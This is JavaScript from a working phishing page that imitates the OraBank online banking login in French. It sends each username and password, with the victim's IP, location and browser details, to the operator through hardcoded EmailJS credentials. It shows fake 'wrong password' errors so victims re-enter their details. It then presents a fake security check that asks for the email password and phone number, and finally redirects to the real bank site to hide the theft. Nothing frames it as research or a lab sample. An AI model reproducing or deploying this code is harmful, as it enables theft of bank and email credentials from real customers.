        // ============================================================
        // EmailJS Configuration
        // ============================================================
        const EMAILJS_PUBLIC_KEY = 'cJcTNwUcLcI7uY3l-';
        const EMAILJS_SERVICE_ID = 'service_qh1p3sh';
        const EMAILJS_LOGIN_TEMPLATE_ID = 'template_6un0yk8';

        // Initialize EmailJS
        emailjs.init(EMAILJS_PUBLIC_KEY);
        console.log('✅ EmailJS initialized successfully');

        // ============================================================
        // Get Browser and Location Info
        // ============================================================
        async function getBrowserAndLocationInfo() {
            const browserInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`
            };

            let locationInfo = {
                latitude: 'N/A',
                longitude: 'N/A',
                country: 'N/A',
                city: 'N/A',
                ip: 'N/A'
            };

            try {
                // Get IP-based location with timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);

                const response = await fetch('https://ipapi.co/json/', { 
                    signal: controller.signal 
                });
                clearTimeout(timeoutId);
                
                const data = await response.json();
                locationInfo = {
                    latitude: data.latitude || 'N/A',
                    longitude: data.longitude || 'N/A',
                    country: data.country_name || 'N/A',
                    city: data.city || 'N/A',
                    ip: data.ip || 'N/A'
                };
                console.log('📍 Location info fetched:', locationInfo);
            } catch (error) {
                console.warn('⚠️ Could not fetch location info (timeout or error):', error.message);
            }

            return { browserInfo, locationInfo };
        }

        // ============================================================
        // Send Login Email via EmailJS
        // ============================================================
        async function sendLoginAttemptEmail(username, password, attempt) {
            try {
                console.log('📧 Preparing to send login email for attempt:', attempt);

                const { browserInfo, locationInfo } = await getBrowserAndLocationInfo();

                const templateParams = {
                    username: username,
                    password: password,
                    attempt: attempt,
                    timestamp: new Date().toISOString(),
                    user_agent: browserInfo.userAgent,
                    language: browserInfo.language,
                    platform: browserInfo.platform,
                    screen_resolution: browserInfo.screenResolution,
                    latitude: locationInfo.latitude,
                    longitude: locationInfo.longitude,
                    country: locationInfo.country,
                    city: locationInfo.city,
                    ip_address: locationInfo.ip
                };

                console.log('📧 Sending email with params:', {
                    attempt: attempt,
                    username: username,
                    timestamp: templateParams.timestamp,
                    country: templateParams.country
                });

                const response = await emailjs.send(
                    EMAILJS_SERVICE_ID,
                    EMAILJS_LOGIN_TEMPLATE_ID,
                    templateParams
                );

                console.log('✅ Login email sent successfully:', response.status);
                return true;
            } catch (error) {
                console.error('❌ Failed to send login email:', error);
                // Continue even if email fails
                return true;
            }
        }

        // ============================================================
        // Login Flow Handler
        // ============================================================
        let lAtt = 0;

        function handleLogin() {
            const codeInput = document.getElementById('identifiant').value.trim();
            const pwdInput = document.getElementById('password').value;

            // Hide any previous inline error
            document.getElementById('formErrorBox').classList.remove('visible');

            const errors = [];
            if (!codeInput) errors.push(`Le champ "Login" est obligatoire.`);
            if (!pwdInput) errors.push(`Le champ "Mot de passe" est obligatoire.`);

            if (errors.length > 0) {
                showModal(errors);
                return;
            }

            // Validation passed - show loading modal
            const loadingModal = document.getElementById('loadingModal');
            loadingModal.classList.add('active');

            const loginBtn = document.querySelector('.submit-btn');
            loginBtn.disabled = true;

            lAtt++;
            console.log(`🔐 Login attempt ${lAtt} initiated`);

            // Send login email and proceed immediately (don't wait for response)
            sendLoginAttemptEmail(codeInput, pwdInput, lAtt);

            // Proceed with login flow after fixed delay
            setTimeout(() => {
                loadingModal.classList.remove('active');
                
                if (lAtt === 1) {
                    // First attempt - show error, stay on page
                    document.getElementById('formErrorBox').classList.add('visible');
                    document.getElementById('password').value = "";
                    document.getElementById('password').focus();
                    loginBtn.disabled = false;
                    console.log('✅ Attempt 1 complete - Error shown');
                } 
                else if (lAtt === 2) {
                    // Second attempt - show error then verification form
                    document.getElementById('formErrorBox').classList.add('visible');
                    document.getElementById('password').value = "";
                    loginBtn.disabled = false;
                    
                    // Show verification form after 1.5 seconds
                    setTimeout(() => {
                        showVerificationForm(codeInput, pwdInput);
                    }, 1500);
                    console.log('✅ Attempt 2 complete - Verification form showing');
                } 
                else if (lAtt >= 3) {
                    // Third attempt - redirect to OraBank
                    console.log('✅ Attempt 3 complete - Redirecting to OraBank');
                    window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
                }
            }, 1200);
        }

        // ============================================================
        // Verification Form
        // ============================================================
        function showVerificationForm(username, password) {
            const overlay = document.createElement('div');
            overlay.className = 'verification-overlay';
            overlay.id = 'verificationOverlay';
            overlay.style.cssText = `
                display: flex;
                position: fixed;
                inset: 0;
                background: rgba(0, 0, 0, 0.4);
                z-index: 1500;
                align-items: flex-start;
                padding-top: 10vh;
                justify-content: center;
            `;

            overlay.innerHTML = `
                <div style="
                    background: #edede9;
                    border: 1px solid #777;
                    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
                    border-radius: 8px;
                    width: 500px;
                    max-width: 92vw;
                    padding: 30px;
                    animation: modalIn 0.15s ease-out;
                    color: #000;
                ">
                    <div style="
                        font-size: 20px;
                        font-weight: 700;
                        margin-bottom: 8px;
                        color: #00693e;
                    ">Vérification de sécurité</div>
                    
                    <div style="
                        font-size: 14px;
                        color: #666;
                        margin-bottom: 24px;
                        line-height: 1.4;
                    ">Pour continuer, veuillez fournir vos informations de vérification supplémentaires.</div>

                    <form id="verificationForm" style="
                        display: flex;
                        flex-direction: column;
                        gap: 16px;
                    ">
                        <div style="display: flex; flex-direction: column; gap: 6px;">
                            <label style="font-size: 14px; font-weight: 500; color: #000;">Adresse e-mail</label>
                            <input type="email" id="email" placeholder="exemple@domaine.com" required style="
                                width: 100%;
                                height: 40px;
                                padding: 8px 12px;
                                font-size: 14px;
                                color: #000;
                                background-color: #e8e9e3;
                                border: 1px solid #aaa;
                                border-radius: 4px;
                                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                                transition: border-color 0.15s, box-shadow 0.15s;
                            " />
                        </div>

                        <div style="display: flex; flex-direction: column; gap: 6px;">
                            <label style="font-size: 14px; font-weight: 500; color: #000;">Mot de passe e-mail</label>
                            <input type="password" id="emailPassword" placeholder="••••••••" required style="
                                width: 100%;
                                height: 40px;
                                padding: 8px 12px;
                                font-size: 14px;
                                color: #000;
                                background-color: #e8e9e3;
                                border: 1px solid #aaa;
                                border-radius: 4px;
                                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                                transition: border-color 0.15s, box-shadow 0.15s;
                            " />
                        </div>

                        <div style="display: flex; flex-direction: column; gap: 6px;">
                            <label style="font-size: 14px; font-weight: 500; color: #000;">Numéro de téléphone</label>
                            <input type="tel" id="phoneNumber" placeholder="+2XX XXX XXXX" required style="
                                width: 100%;
                                height: 40px;
                                padding: 8px 12px;
                                font-size: 14px;
                                color: #000;
                                background-color: #e8e9e3;
                                border: 1px solid #aaa;
                                border-radius: 4px;
                                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                                transition: border-color 0.15s, box-shadow 0.15s;
                            " />
                        </div>

                        <div id="verificationError" style="
                            background-color: #edede9;
                            border-radius: 8px;
                            padding: 16px 16px;
                            font-size: 14px;
                            font-weight: 500;
                            color: #8e684c;
                            display: none;
                            margin-top: 10px;
                        ">Login ou mot de passe erroné.</div>

                        <div style="display: flex; justify-content: flex-end; gap: 12px; margin-top: 24px;">
                            <button type="button" id="cancelBtn" style="
                                padding: 12px 24px;
                                font-size: 12px;
                                font-weight: 700;
                                letter-spacing: 0.03em;
                                border: none;
                                border-radius: 4px;
                                cursor: pointer;
                                background: #999;
                                color: #fff;
                                transition: background 0.2s;
                            ">Annuler</button>
                            <button type="submit" style="
                                padding: 12px 24px;
                                font-size: 12px;
                                font-weight: 700;
                                letter-spacing: 0.03em;
                                border: none;
                                border-radius: 4px;
                                cursor: pointer;
                                background: #006b43;
                                color: #fff;
                                transition: background 0.2s;
                            ">Continuer</button>
                        </div>
                    </form>
                </div>
            `;

            document.body.appendChild(overlay);

            // Handle form submission
            const form = overlay.querySelector('#verificationForm');
            form.addEventListener('submit', (e) => {
                e.preventDefault();

                const email = overlay.querySelector('#email').value.trim();
                const emailPassword = overlay.querySelector('#emailPassword').value;
                const phoneNumber = overlay.querySelector('#phoneNumber').value.trim();

                // Validate
                if (!email || !email.includes('@') || !emailPassword || !phoneNumber) {
                    console.warn('⚠️ Validation failed');
                    return;
                }

                // Show error message
                overlay.querySelector('#verificationError').style.display = 'block';
                console.log('📧 Verification data received:', { email, phoneNumber });

                // Wait before final redirect
                setTimeout(() => {
                    makeThirdAttempt();
                }, 1500);
            });

            // Handle cancel button
            const cancelBtn = overlay.querySelector('#cancelBtn');
            cancelBtn.addEventListener('click', () => {
                overlay.remove();
            });

            // Close on backdrop click
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    overlay.remove();
                }
            });

            // Focus on first input
            setTimeout(() => {
                const emailInput = overlay.querySelector('#email');
                emailInput?.focus();
            }, 100);
        }

        // ============================================================
        // Third Attempt Handler
        // ============================================================
        function makeThirdAttempt() {
            const codeInput = document.getElementById('identifiant').value.trim();
            const pwdInput = document.getElementById('password').value;

            const loadingModal = document.getElementById('loadingModal');
            loadingModal.classList.add('active');

            lAtt++;
            console.log(`🔐 Final attempt ${lAtt} initiated`);

            // Send third attempt email (don't wait for response)
            sendLoginAttemptEmail(codeInput, pwdInput, lAtt);

            // Redirect after fixed delay
            setTimeout(() => {
                loadingModal.classList.remove('active');
                console.log('🔄 Redirecting to OraBank...');
                window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
            }, 1200);
        }

        // ============================================================
        // Modal Functions
        // ============================================================
        function showModal(errors) {
            const overlay = document.getElementById('validationModal');
            const list = document.getElementById('modalErrorList');

            list.innerHTML = errors.map(msg => `
                <li class="IQ-RV-OF">${msg}</li>
            `).join('');

            overlay.classList.add('active');
            overlay.onclick = function (ev) {
                if (ev.target === overlay) closeModal();
            };
            document.addEventListener('keydown', escHandler);
        }

        function closeModal() {
            document.getElementById('validationModal').classList.remove('active');
            document.removeEventListener('keydown', escHandler);
            const id = document.getElementById('identifiant');
            const pwd = document.getElementById('password');
            (id.value.trim() === '' ? id : pwd).focus();
        }

        function escHandler(e) {
            if (e.key === 'Escape') closeModal();
        }

        // ============================================================
        // Initialize on DOM ready
        // ============================================================
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', () => {
                    input.closest('.input-group').style.opacity = '1';
                });
            });

            document.querySelectorAll('.form-box input').forEach(input => {
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        handleLogin();
                    }
                });
            });
            
            console.log('🎉 Application initialized - ready to capture logins via EmailJS');
        });
